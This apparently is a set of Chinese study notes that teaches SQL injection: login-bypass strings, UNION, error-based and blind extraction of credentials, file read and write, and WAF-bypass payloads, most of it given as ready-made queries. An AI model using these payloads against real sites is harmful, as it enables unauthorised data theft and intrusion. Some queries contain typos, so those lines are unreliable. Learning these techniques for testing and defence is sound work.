SQL

### select 

sql注入原理

列如：?id='1'

?id='-1' union select 1,2,3 --+'

两边单引号被闭合掉就直接跳过然后中间的就执行了


[sql注入之万能密码原理](https://blog.csdn.net/hxhxhxhxx/article/details/108020010)

```
' or 1='1

'or'='or'

admin

admin'--

admin' or 4=4--

admin' or '1'='1'--

admin888

"or "a"="a

admin' or 2=2#

a' having 1=1#

a' having 1=1--

admin' or '2'='2

')or('a'='a

or 4=4--

c

a'or' 4=4--

"or 4=4--

'or'a'='a

"or"="a'='a

'or''='

'or'='or'

1 or '1'='1'=1

1 or '1'='1' or 4=4

'OR 4=4%00

"or 4=4%00

'xor

admin' UNION Select 1,1,1 FROM admin Where ''='

1

-1%cf' union select 1,1,1 as password,1,1,1 %23

1

17..admin' or 'a'='a 密码随便

'or'='or'

'or 4=4/*

something

' OR '1'='1

1'or'1'='1

admin' OR 4=4/*

1'or'1'='1
```

#### 判闭合


步骤

首先试试

?id=1'

?id=1"

==如果都报错，及为整形注入==（没有符号闭合）

如果?id=1'报错，==及试试注释掉后面的:?id=1' --#==

如果还报错就可能是单引号加括号或是其他的:?id=1') --#

双引号同之
```php
SELECT * FROM `users` WHERE id= 1;#整形闭合
SELECT * FROM `users` WHERE id='1'; #单引号闭合
SELECT * FROM `users` WHERE id="1";#双引号闭合
SELECT * FROM `users` WHERE id=('1');#单引号加括号
SELECT * FROM `users` WHERE id=("1");#双引号加括号

```

实行

万能语句

```php
1 or 1=1 --# 1) or 1=1 --# 1)) or 1=1 --#

1' or 1=1 --# 1') or 1=1 --# 1')) or 1=1 --#

1" or 1=1 --# 1") or 1=1 --# 1")) or 1=1 --#
```

#### 分数符

步骤

用经典的 and 1=1 and 1=2

```
?id=1* and 1=1 (页面无反应)

?id=1* and 1=2 (页面报错)
```

##### 数字型注入

原理：==数字型它会分析数字接着执行sql语句，字符型直接将and后面的转换成字符==

字符型和数字型的区别：==字符型需要单引号或者其他闭合，数字型不要单引号闭合==
实行
这是可以被数字型注入的源代码。不用闭合和注释
```php
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```
```
?id=1* and 1=1

?id=1* and 1=2
```
##### 字符型注入
==关键是如何闭合sql语句以及注释多余的代码==
这是可以被字符型注入的源代码。
```php
  $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```
可以用对应的闭合符号去闭合，或者用注释符号。

#### 开联合

步骤

==判断字段数==

?id=1* order by 3 --#

==判断回显点==

?id=1* union select 1,2,3 -- #

==有回显点及联合查询==
#### SQL Server
###### SQL server提供了大量识图，便于取得元数组
| 数据库识图 | 说明 |
| ---- | ---- |
| sys.databases | SQL Server中的所有数据库 |
| sys.sql_longins | SQL Server 中的所有登录名 |
| information_schema.tables | 当前用户数据库中的表 |
| information_schema.columns | 当前用户数据库中的列 |
###### Order by
order by子句为select查询列的排序，判断表的列数。
```
id=1 orderby 1
id=1 orderby 2
id=1 orderby 3
id=1 orderby 4 //报错
```
这样就知道有3列了。
###### union查询
union关键字可以把两个或多个查询结果组合为单个结果，俗称联合查询。

#### Mysql
###### Mysq注释
| # | 注释从‘#’字符到行尾 |
| ---- | ---- |
| -- | 从--序列到行尾，后面要跟一个空格 |
| `/**/` | 注释从`/*`到后面`*/`xu序列中的字符 |
| `/!**/` | 内联注释 |
###### 常用参数
在Mysql 5.0版本后，Mysql默认在数据库放了个information_schema的数据库，在该库中最需要记住的是三个表名：schemata,tables,columns

schemata表记录数据所有数据库的库名，字段名为schema_name
![[Pasted image 20240116144728.png]]

tables表记录数据库库名的表名的字段名分别为table_schema和table_name
![[Pasted image 20240116145334.png]]
columns表记录的数据库库名，表名，字段名的字段名分别为：table_schema,table_name,column_name
![[Pasted image 20240116145432.png]]

**information_schema.tables：记录所有表名信息的表**

**information_schema.columns：记录所有列名信息的表**

**table_name：表名**

**column_name：列名**

**table_schema：数据库名**

**user()** **查看当前MySQL登录的用户名**

**database() 查看当前使用MySQL数据库名**

**version() 查看当前MySQL版本**
##### Mysql查询语句
```mysql
SELECT 查询的字段名 FROM 库名.表名
SELECT 查询的字段名 FROM 库名.表名 WHERE 以知条件的字段名='以知条件的值'
SELECT 列名 FROM 库名.表名
```
SQL手工注入方法  
```mysql
select schema_name from information_schema.schemata（查库）  
select table_name from information_schema.tables where table_schema=库名（查表）  
select column_name from information_schema.colums where table_name=表名（查列）  
select 列名 from 库名.表名（查数据）
```
###### limit 的用法
limit使用格式:limit m,n ，其中m是指记录开始的位置，n是指n条记录。


###### mysql获取元数据


一次性只能出几个内容，要使用group_concat()函数才好
![[Pasted image 20240116102944.png]]
###### Mysql函数利用
1, load_file()函数读取文件操作，==必须要有FILE权限，文件容量小于16MB。文件名称为绝对路径==
```
?id=-1* union select 1,2,load_file(/var/www/html/index.php) #读取index.php源码
```
2, into outfile写文件操作
```
?id=-1*select '<?php phpinfo()?>' into outfile 'C:\wwwortt\1.php'
```
3, 连接字符
在mysql查询中，如果需要一次性查多个数据，可以使用concat()或concat_ws()函数完成
```
?id=-2' union select 1,concat(user(),0x2c,database())#-2' union select 1,concat(user(),0x2c,database())#
```
勉强返回两个用户和数据库名字，可以使用 limit 0,1|limit 1,2这样查看。
![[Pasted image 20240116103143.png]]
4，更多常用函数

| 函数 | 说明 |
| ---- | ---- |
| length | 返回字符串长度 |
| substring | 截取字符串长度 |
| ascii | 返回ASCII码 |
| hex | 把字符串转十六进制 |
| now | 当前系统时间 |
| unhex | hex的反向操作 |
| floor(x) | 返回不大于x的最大整数值 |
| md5 | 返回MD5值 |
| group_concat | 返回带有来自一个组的连接的非NUL值的字符串结果 |
| @@datadir | 读取数据库路径 |
| @@basedir | MySQL 安装路径 |
| @2version_compile_os | 操作系统 |
| user | 用户名 |
| current_user | 当前用户名 |
| system_user | 系统用户名 |
| databas | 数据库名 |
| version | MySQL 数据库版本 |
###### group_concat函数查询

数据库名字

```
?id=1* union select 1,2,database() --#
```

查表

```
?id=-1* union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --#
```

查列

```
?id=-1* union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --#
```

查值

```
?id=-1* union select 1,2,group_concat(username,0x3a,password) from users --#
```
##### Mysql报错注入

通过页面返回结果，直接将报错信息输出到页面上，所有可以利用报错注入获取数据。
两种函数
```
?id=1* and updatexml(1,concat(0x7e,(mysql命令),0x7e),1)--+
?id=1* and extractvalue(1,concat(0x7e,(mysql命令)))--+
```
###### ==extractvalue==


数据库名字

```
?id=1* and extractvalue(1,concat(0x7e,database())) --#
```

查表

```
?id=1* and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --#
```

查列

```
?id=1* and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --#
```

查值

```
?id=1* and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users))) --#
```

###### ==updatexml==

数据库名字

```
?id=1* and updatexml(1,concat(0x7e,database(),0x7e),1) --#
```

查表

```
?id=1* and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) --#
```

查列

```
?id=1* and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) --#
```

查值

```
?id=1* and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from usres ),0x7e),1) --#
```

##### Mysql宽字节注入
宽字节注入漏洞原理就是因为编码不统一所照成的，这种注入一般出现在PHP+Mysql中。
==php配置文件的php.ini中存在magic_quotes_gpc选项，被成为魔术引号，开启时候，会把get,post,cookie接收的（'"\null）等都会自动加上反斜杠转义。==


##### 堆叠查询注入攻击
堆叠注入查询可以执行多条语句，多条语句用分号分开。
同时查询两个内容

![[Pasted image 20240116201828.png]]
###### http头注入
注入点可能在User-agent或者Accept头。
```
1'and+updatexml(1,concat(0x7e,(select+database()),0x7e),1)or'
```
![[Pasted image 20240117192720.png]]



#### 盲注

步骤

##### ==布尔盲注==

一个页面没有报错和显示位，只有通过页面返回的对与错进行注入

##### ==延时盲注==

用?id=1* and sleep(4) --#

==时间超过4秒及为有延时注入==

if(条件，表达式1,表达式2):如果条件为真，返回表达式1,否则返回表达式2

?id=1* and if(length(database())=7,sleep(3),1) --#

实行

==布尔盲注==

猜测数据库名的字符数量

?id=1* and length(database())=8 --#

数据库名的第一个字符的ASCII值为115

?id=1* and ascii(substr(database(),1,1))=115 --#

判断数据库中有几个表

?id=1* and (select count(table_name) from information_schema.tables where table_schema=database())=5 --#

判断第一个表多少个字符

?id=1* and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=5 --#

判断第一个表名的第一个字符的ascii

?id=1* and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=115 --#

改变 limit 0,1 为 limit 1,1就是换一个列，改变,1,1 为,2,1 其他不变就是改变成第二个字符的ascii值。

判断user表有几个列

?id=1* and (select count(column_name) from information_schema.columns where table_name='user')=11 --#

判断user表的第一个列名字的第一个字符的ascii值

?id=1* and ascii(substr((select column_name from information_schema.columns where table_name='user' limit 0,1),1,1))=115 --#

改变 limit 0,1 为 limit 1,1就是换一个列，改变,1,1 为,2,1 其他不变就是改变成第二个字符的ascii值。

判断user表的username列中有几条数据

?id=1* and (select count(username) from user)=3 --#

判断username中的第一条数据的字符数有多少个

?id=1* and length((select username from usres limit 0,1))=4 --#

判断username中第一条数据第一个字符的ASCII码值

?id=1* and ascii(substr((select usrename from users limit 0,1),1,1))=65 --#

改变 limit 0,1 为 limit 1,1就是换一个列，改变,1,1 为,2,1 其他不变就是改变成第二个字符的ascii值。\

==延时盲注==

用 if（布尔盲注的语句,sleep(2),1) --#

对了就延迟2秒


## insert/update/delete注入
[insert/update/delete注入-CSDN博客⁤](https://blog.csdn.net/qq_35599248/article/details/122440184)




### WAF绕过

##### 空格绕过

两个空格代替一个空格，用Tab代替空格，%a0=空格

果然空格被过滤，括号没被过滤可以用括号绕过（）

```
或者用/* */绕过和${IFS}
```

##### 引号绕过

绕过引号被忽略，可以将引号的内容用十六进制代替前面加个0x

例如 users => 0x7573657273

##### 逗号绕过

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：

select substr(database(0from1for1);select mid(database(0from1for1);

##### or and 绕过

and=&& or=||

分号; 和%0a

##### 绕过注释符（-- ,#）

?id=1* union select 1,2,3 || '1

?id=1* union select 1,2,'3

常用注释符绕过union，select，where：

```
//，-- , /**/, #, --+, -- -, ;,%00,--a

U/**/NION/**/SE/**/LECT/**/user，pwd from user

但在安全狗里却不一定好用，大概率被过滤，其实**/***和***/**中间是可以加特殊符号的，但加什么，其实需要慢慢试，这时候就可以用到fuzz了，直接选中/*和*/中间的数据，将其作为变量进行爆破，如下
```

大小写绕过

```
?id=1+UnloN/**/SeLeCT
```

联合注入绕过代码

```
id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM/*information_schema*/.tables/*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -
```

双向关键字绕过

```
?id=1+UNIunionON+SeLselectECT+1,2,3–
```

二次编码注入

```
'如果靶机用了addslashes和urldecode函数那就使用%2527
```

因为%url编码等于%25所以url将%25解码后加上就是%27然后urldecode解码就是单引号

从而实现绕过

![0](data:image/png;base64,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